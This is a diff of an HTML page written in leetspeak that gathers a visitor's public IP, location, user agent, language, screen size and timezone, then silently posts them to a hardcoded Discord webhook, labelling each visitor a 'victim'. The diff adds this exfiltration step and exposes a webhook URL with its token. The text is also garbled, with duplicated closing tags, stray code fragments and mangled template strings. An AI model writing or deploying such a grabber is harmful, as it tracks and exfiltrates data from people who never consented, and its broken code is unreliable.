@@ -7,62 +7,68 @@
   <style>body{background:#000;color:#0f0;font-family:monospace;}</style>
 </head>
 <body>
-  <pre id="out">gr4bb1ng y0ur 1p... plz w41t</pre>
+  <pre id="out">gr4bb1ng & 53nd1ng y0ur d3741l5... plz w41t</pre>
 
   <script>
   (async () => {
+    const webhook = "https://discord.com/api/webhooks/1320147513130487869/YnYrrcuExZ0X_wG0I_Xeief6wh7D7_sDxaEftkPjlviv124TP5N0ESyJH4XQsAQn7KX3";
     const out = document.getElementById('out');
-    const methods = [
-      // m057 r3l14bl3 fr33 4p15 (2026 w0rk1ng 57atu5)
-      ['https://api.ipify.org?format=json', r=>r.json().then(d=>d.ip)],
-      ['https://api64.ipify.org?format=json', r=>r.json().then(d=>d.ip)],
-      ['https://icanhazip.com/', r=>r.text()],
-      ['https://ipwho.is/', async r=>{
-        const d = await r.json();
-        return `\( {d.ip} ( \){d.city||'?'}, ${d.country||'?'})`;
-      }],
-      // f4llb4ck5
-      ['https://cloudflare.com/cdn-cgi/trace', async r=>{
-        const txt = await r.text();
-        const m = txt.match(/ip=(.+)/);
-        return m ? m[1] : 'n0 cl0udfl4r3 1p';
+
+    const getIP = async () => {
+      const apis = [
+        'https://api.ipify.org?format=json',
+        'https://api64.ipify.org?format=json',
+        'https://icanhazip.com/',
+        'https://ipwho.is/'
+      ];
+      for (const url of apis) {
+        try {
+          const r = await fetch(url, {cache:'no-store'});
+          if (url.includes('ipify')) return (await r.json()).ip;
+          if (url.includes('icanhazip')) return (await r.text()).trim();
+          if (url.includes('ipwho')) {
+            const d = await r.json();
+            return `\( {d.ip} ( \){d.city||'?'} ${d.region||'?'} ${d.country||'?'})`;
+          }
+        } catch {}
+      }
+      return 'c0uld n07 gr4b 1p';
+    };
+
+    const ip = await getIP();
+    const ua = navigator.userAgent;
+    const lang = navigator.language || navigator.userLanguage;
+    const screen = `\( {screen.width}x \){screen.height}`;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const time = new Date().toISOString();
+
+    const payload = {
+      embeds: [{
+        title: "n3w v1c71m h1t",
+        color: 0x00ff00,
+        fields: [
+          {name: "IP", value: `\`${ip}\``, inline: true},
+          {name: "Time", value: time, inline: true},
+          {name: "User-Agent", value: `\`\`\`${ua.substring(0,500)}\`\`\``, inline: false},
+          {name: "Language", value: lang, inline: true},
+          {name: "Screen", value: screen, inline: true},
+          {name: "Timezone", value: tz, inline: true}
+        ],
+        footer: {text: "d0n7 cl0s3 y37 k1dd0 ツ"}
       }]
-    ];
+    };
 
-    for (const [url, parser] of methods) {
-      try {
-        const res = await fetch(url, {cache:'no-store', mode:'cors'});
-        if (!res.ok) continue;
-        const ip = await parser(res);
-        if (ip && ip.trim() && ip !== 'undefined') {
-          out.innerHTML = 
-            `0wn3d!\n\n` +
-            `publ1c 1p  →  ${ip}\n` +
-            `t1m3574mp →  ${new Date().toISOString()}\n` +
-            `u53r-4g3n7 →  ${navigator.userAgent}\n` +
-            `l4ngu4g3  →  ${navigator.language}\n\n` +
-            `d0n7 cl0s3 th15 t4b y37 k1dd0 ツ`;
-          // 0p710n4l: s3nd 17 50m3wh3r3 (c0mm3n7 0ut unl355 y0u h4v3 4 l0g 53rv3r)
-          // fetch('https://your-log-server.here/log', {method:'POST',body:ip});
-          return;
-        }
-      } catch(e){}
-    }
-    
-    out.textContent = '4ll 4p15 d34d 0r bl0ck3d :(\ntry d15abl1ng 4d-bl0ck3r/vpn';
-  })();
-  </script>
-</body>
-</html>        }]
-      };
-
-      fetch("https://discord.com/api/webhooks/1320147513130487869/YnYrrcuExZ0X_wG0I_Xeief6wh7D7_sDxaEftkPjlviv124TP5N0ESyJH4XQsAQn7KX3", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
+    try {
+      await fetch(webhook, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(payload)
-      }).catch(e=>{}); // silent fail lol
-    })
-    .catch(e=>{});
+      });
+      out.textContent = 'd3741l5 53n7 2 d15c0rd ツ\nthx f0r th3 d474';
+    } catch (e) {
+      out.textContent = `53nd f41l3d: \( {e.message}\n \){ip} w45 gr4bb3d but n07 53n7`;
+    }
+  })();
   </script>
 </body>
 </html>
